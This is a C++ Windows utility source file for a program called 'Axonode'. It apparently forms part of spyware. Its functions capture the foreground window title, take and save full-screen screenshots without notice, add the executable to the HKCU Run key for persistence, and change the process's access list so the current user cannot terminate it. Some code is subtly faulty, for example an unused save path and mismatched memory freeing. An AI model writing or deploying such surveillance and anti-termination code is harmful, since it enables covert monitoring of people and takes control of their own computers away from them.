#include "stdafx.h"
#include "axonUtil.h"
#include <string>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <algorithm>
#include <time.h>
#include <direct.h>
#include <shlwapi.h>
#include <VersionHelpers.h>
#include <AccCtrl.h>
#include <Aclapi.h>
#pragma comment (lib, "shlwapi")

#pragma region RetrieveOS
BOOL WINAPI isXP()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 5;
	info.dwMinorVersion = 1;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}

BOOL WINAPI isVista()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 6;
	info.dwMinorVersion = 0;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}

BOOL WINAPI isWin7()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 6;
	info.dwMinorVersion = 1;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}

BOOL WINAPI isWin8()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 6;
	info.dwMinorVersion = 2;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}

BOOL WINAPI isWin81()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 6;
	info.dwMinorVersion = 3;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}

BOOL WINAPI isWin10()
{
	OSVERSIONINFOEX info;
	DWORDLONG dwlCondition = 0;
	int op = VER_GREATER_EQUAL;

	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	info.dwMajorVersion = 10;
	info.dwMinorVersion = 0;

	VER_SET_CONDITION(dwlCondition, VER_MAJORVERSION, op);
	VER_SET_CONDITION(dwlCondition, VER_MINORVERSION, op);

	return VerifyVersionInfo(&info, VER_MAJORVERSION | VER_MINORVERSION, dwlCondition);
}
std::string getOS()
{
	std::string os = "Unknown";

	if (isWin10())
		os = "Windows 10";
	else if (isWin81())
		os = "Windows 8.1";
	else if (isWin8())
		os = "Windows 8";
	else if (isWin7())
		os = "Windows 7";
	else if (isVista())
		os = "Windows Vista";
	else if (isXP())
		os = "Windows XP";

	return os;
}
#pragma endregion

#pragma region winTitle

char* getWindowTitle()
{
	HWND hWnd = GetForegroundWindow();
	int nLen = GetWindowTextLength(hWnd) + 1;
	char *szTitle = new char[nLen + 1];
	GetWindowTextA(hWnd, szTitle, nLen);

	return szTitle;
}

#pragma endregion

#pragma region getPath

std::string getPath()
{
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	return std::string(buffer).substr(0, pos);
}


#pragma endregion

#pragma region saveBMP

void saveBMP(HBITMAP bitmap, HDC hDC, LPTSTR filename)
{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	WORD cClrBits;
	HANDLE hf; // file handle 
	BITMAPFILEHEADER hdr; // bitmap file-header 
	PBITMAPINFOHEADER pbih; // bitmap info-header 
	LPBYTE lpBits; // memory pointer 
	DWORD dwTotal; // total count of bytes 
	DWORD cb; // incremental count of bytes 
	BYTE *hp; // byte pointer 
	DWORD dwTmp;

	// create the bitmapinfo header information

	if (!GetObject(bitmap, sizeof(BITMAP), (LPSTR)&bmp))
	{
		std::cout << "Could not retrieve bitmap info";
		return;
	}

	// Convert the color format to a count of bits. 
	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else cClrBits = 32;
	// Allocate memory for the BITMAPINFO structure.
	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	// Initialize the fields in the BITMAPINFO structure. 

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

	// If the bitmap is not compressed, set the BI_RGB flag. 
	pbmi->bmiHeader.biCompression = BI_RGB;

	// Compute the number of bytes in the array of color 
	// indices and store the result in biSizeImage. 
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8 * pbmi->bmiHeader.biHeight * cClrBits;
	// Set biClrImportant to 0, indicating that all of the 
	// device colors are important. 
	pbmi->bmiHeader.biClrImportant = 0;

	// now open file and save the data
	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits) {
		std::cout << "writeBMP::Could not allocate memory";
		return;
	}

	// Retrieve the color table (RGBQUAD array) and the bits 
	if (!GetDIBits(hDC, HBITMAP(bitmap), 0, (WORD)pbih->biHeight, lpBits, pbmi,
		DIB_RGB_COLORS)) {
		std::cout << "writeBMP::GetDIB error";
		return;
	}

	// Create the .BMP file. 
	hf = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, (DWORD)0,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);
	if (hf == INVALID_HANDLE_VALUE) {
		std::cout << "Could not create file for writing";
		return;
	}
	hdr.bfType = 0x4d42; // 0x42 = "B" 0x4d = "M" 
						 // Compute the size of the entire file. 
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	// Compute the offset to the array of color indices. 
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD);

	// Copy the BITMAPFILEHEADER into the .BMP file. 
	if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
		(LPDWORD)&dwTmp, NULL)) {
		std::cout << "Could not write in to file";
		return;
	}

	// Copy the BITMAPINFOHEADER and RGBQUAD array into the file. 
	if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
		+ pbih->biClrUsed * sizeof(RGBQUAD),
		(LPDWORD)&dwTmp, (NULL))) {
		std::cout << "Could not write in to file";
		return;
	}


	// Copy the array of color indices into the .BMP file. 
	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL)) {
		std::cout << "Could not write in to file";
		return;
	}

	// Close the .BMP file. 
	if (!CloseHandle(hf)) {
		std::cout << "Could not close file";
		std::cout;
	}

	// Free memory. 
	GlobalFree(lpBits);
	GlobalFree(pbmi);
}

#pragma endregion

#pragma region getWChar

wchar_t* getWChar(std::string in)
{
	wchar_t* wide_string = new wchar_t[in.length() + 1];
	std::copy(in.begin(), in.end(), wide_string);
	wide_string[in.length()] = 0;

	return wide_string;
}

#pragma endregion

#pragma region SS

void getScreenShot()
{
	std::string path = getPath();
	path += "\\Screenshots";

	struct tm newtime;
	time_t now = time(0);
	localtime_s(&newtime, &now);
	
	std::string curDTime = std::to_string(1900 + newtime.tm_year) + '-' + std::to_string(1 + newtime.tm_mon) + '-' + std::to_string(newtime.tm_mday) +
		'-' + std::to_string(newtime.tm_hour) + '-' + std::to_string(1 + newtime.tm_min) + '-' + std::to_string(1 + newtime.tm_sec);

	std::string fName = "ScreenShot-";
	fName += curDTime;
	fName += ".bmp";
	std::replace(fName.begin(), fName.end(), ' ', '-');
	replace(fName.begin(), fName.end(), ':', '-');
	fName.erase(remove(fName.begin(), fName.end(), '\n'), fName.end());

	std::string fullPath = path + "\\" + fName;

	HDC hScreen = GetDC(NULL);
	HDC hDC = CreateCompatibleDC(hScreen);
	int width = GetDeviceCaps(hDC, HORZRES);
	int height = GetDeviceCaps(hDC, VERTRES);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BOOL bRet = BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

	wchar_t* newChar = getWChar(fName);

	if (PathIsDirectoryA(path.c_str()) != 0)
	{
		saveBMP(hBitmap, hDC, newChar);
		std::cout << "\n[SCREENSHOT SAVED] \n";
	}
	else
	{
		_mkdir(path.c_str());
		saveBMP(hBitmap, hDC, newChar);
		std::cout << "\n[SCREENSHOT SAVED] \n";
	}

	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);
	DeleteObject(hBitmap);
	delete[] newChar;
}

#pragma endregion

#pragma region getStartup

BOOL getStartup(PCWSTR appName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, appName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

#pragma endregion

#pragma region setStartup

BOOL setStartup(PCWSTR appName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
		wcscat_s(szValue, count, args);

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

#pragma endregion

#pragma region addStartup

void addStartup()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	setStartup(L"Axonode", szPathToExe, NULL);
}

#pragma endregion

#pragma region ProtectProcess

const bool ProtectProcess()
{
	HANDLE hProc = GetCurrentProcess();
	EXPLICIT_ACCESS dAccess = { 0 };
	DWORD dwAPerm = GENERIC_WRITE | PROCESS_ALL_ACCESS | WRITE_DAC | DELETE | WRITE_OWNER | READ_CONTROL;
	BuildExplicitAccessWithName(&dAccess, _T("CURRENT_USER"), dwAPerm, DENY_ACCESS, NO_INHERITANCE);
	PACL pTempDacl = NULL;
	DWORD dwErr = 0;
	dwErr = SetEntriesInAcl(1, &dAccess, NULL, &pTempDacl);
	dwErr = SetSecurityInfo(hProc, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pTempDacl, NULL);
	LocalFree(pTempDacl);
	CloseHandle(hProc);
	return dwErr == ERROR_SUCCESS;
}

#pragma endregion